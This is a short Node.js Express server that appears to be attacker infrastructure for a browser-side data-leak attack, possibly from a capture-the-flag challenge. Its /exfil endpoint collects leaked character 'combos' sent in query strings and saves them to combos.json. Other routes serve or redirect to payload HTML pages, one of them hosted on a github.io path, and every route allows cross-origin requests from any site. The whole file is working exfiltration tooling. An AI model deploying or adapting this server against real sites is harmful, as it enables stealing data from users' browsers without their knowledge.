const express = require('express');
const fs = require('fs');

const app = express();

const data = new Map();
const exfils = [];

setInterval(() => {
  fs.writeFileSync('combos.json', JSON.stringify(exfils));
}, 5000);

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  next();
});

app.get('/exfil', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  const key = req.query.r;
  if (!data.has(key)) {
    data.set(key, { combos: [], start: '' });
    setTimeout(() => {
      const { combos, start } = data.get(key);
      console.log('got combos', key, combos.length);
      exfils.push({ key, combos, start });
      data.delete(key);
    }, 10000);
  }
  if (req.query.s) {
    data.get(key).start = req.query.s;
  }
  else if (req.query.c) {
    data.get(key).combos.push(req.query.c);
  }
  res.status(200).send('poggo');
});

app.get('/frames', (req, res) => {
  const page = fs.readFileSync(`payload.html`).toString();
  res.header('Access-Control-Allow-Origin', '*');
  res.status(200).send(page);
});

app.get('/css/:num', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.redirect(`https://r2dev2.github.io/private/payload/${req.params.num}.html`);
  /*
  const page = fs.readFileSync(`payload/${req.params.num}.html`).toString();
  res.header('Access-Control-Allow-Origin', '*');
  res.status(200).send(page);
  */
});

app.listen(8000);
